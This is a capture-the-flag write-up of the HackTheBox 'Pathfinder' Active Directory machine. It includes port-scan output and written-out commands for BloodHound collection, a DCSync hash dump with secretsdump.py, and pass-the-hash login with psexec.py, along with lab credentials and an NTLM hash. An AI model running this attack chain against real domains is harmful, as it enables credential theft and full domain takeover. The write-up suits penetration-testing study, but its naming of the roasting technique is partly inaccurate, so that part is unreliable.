# HackTheBox-Pathfinder

## Rustscan
```bash

rustscan -a 10.10.10.30 -- -A -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com


Open 10.10.10.30:53
Open 10.10.10.30:88
Open 10.10.10.30:135
Open 10.10.10.30:139
Open 10.10.10.30:389
Open 10.10.10.30:445
Open 10.10.10.30:464
Open 10.10.10.30:593
Open 10.10.10.30:636
Open 10.10.10.30:3268
Open 10.10.10.30:3269
Open 10.10.10.30:5985
Open 10.10.10.30:9389


PORT     STATE SERVICE       REASON          VERSION
PORT     STATE SERVICE       VERSION                                      
53/tcp   open  domain?
| fingerprint-strings:                                                                                                                              
|   DNSVersionBindReqTCP:                                                 
|     version                                                             
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-09 07:40:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing

```

## PORT  139/445 (SMB)
We check for smb share if there are any 

<img src="https://imgur.com/4NFZwar.png"/>

Let's test for brute forcing any user name

<img src="https://imgur.com/JbQwBvh.png"/>

We didn't get anything out of it but found host name `PATHFINDER`, so let's move on to a different port

## PORT 389 (LDAP)

We wil be using Python based ingestor for BloodHound,by specifiying the username and password `sandra:Password1234!` which I don't know where I could find them , in the official writeups it was referenced to be found from a previous machine which they didn't mention so I am going to use these credentials to authenticate when using this python tool

```
python3 bloodhound.py -d 'megacorp.local' -u 'sandra' -p 'Password1234!' -gc 'pathfinder.megacorp.local' -c all -ns 10.10.10.30
```

Let's break down the arugments here

-d ---> This is for specifying domain name in this case we have a domain `megacorp.local` which can be seen from nmap scan

-u --->  This is for specifying a username
-p --->  This is for specifying a password
-gc ---> This is for specifying name of the host which is `pathfinder` which we have seen when we were trying to use crackmapexec to brute force users

-c ---> This is for collection method and we set this to `all` which will try to dump information regarding roup, LocalAdmin, Session, Trusts, Default (all previous),DCOnly (no computer connections), DCOM, RDP,PSRemote, LoggedOn, ObjectProps, ACL, All (all except LoggedOn)

-ns --->  This is for specifying the name server in this case it is the machine IP

<img src="https://imgur.com/rxFVXGf.png"/>

We now have these json files

<img src="https://imgur.com/7mqammn.png"/>

Let's start `neo4j` and `bloodhound` and import these files into it

<img src="https://imgur.com/uJwJ1wX.png"/>

<img src="https://imgur.com/9evO4pF.png"/>

Create an archive for this json files 

<img src="https://imgur.com/uq8PceG.png"/>

Drag and drop the archive into the bloodhound GUI. Run the query of `Find All Domain Admins`

<img src="https://imgur.com/5xjSbZF.png"/>

Run the query of `Find All kerberoastable Accounts`

<img src="https://imgur.com/u2Lm7OX.png"/>

Run query of `Find Path to kerberoastable Accounts`

<img src="https://imgur.com/r7N7giw.png"/>

So from running these queries we know that service account `SVC_BES` is kerberoastable, let's run the python script `GetNPUsers.py` from `Impacket`

<img src="https://imgur.com/KZZQZyI.png"/>

Now running with `-request` parameter we can get a TGT hash

<img src="https://imgur.com/nt8ec28.png"/>

Going to hashcat examples we can see what type of hash is this

<img src="https://imgur.com/fuyMeAn.png"/>

So we are going to use `hashcat` to crack the hash

<img src="https://imgur.com/1P5Ipa9.png"/>

<img src="https://imgur.com/pbbCHsk.png"/>

Now we have cracked the kerberoast hash since winrm port (5985) is open we can use `evil-winrm` to login with the new credentials

<img src="https://imgur.com/lxiQopZ.png"/>

Now here let's look the result of our loot from bloodhound by running the `DCsync` query which will allow us to dump hashes from NTDS.dit which holds the passwords for all acounts in AD

<img src="https://i.imgur.com/TdYo58x.png"/>

We can see the user which we kerberoasted has privileges for `GetChangesAll` which means we can request for replication for NTDS.dit 

<img src="https://imgur.com/EqDwWvM.png"/>

Using `secretsdump.py` for dumping hashes from NTDS.dit

```
./secretsdump.py 'MEGACORP.LOCAL/svc_bes':'Sheffield19'@10.10.10.30 -just-dc-ntlm
```

<img src="https://imgur.com/j0ocoSy.png"/>

We have the hashes and we don't need to crack these hash we can use `psexec.py` or `evil-wirm` to authenticate our selves

<img src="https://imgur.com/BgBLDsr.png"/>

```
python psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 -hashes 'aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18'
```

<img src="https://imgur.com/dBUUfqn.png"/>
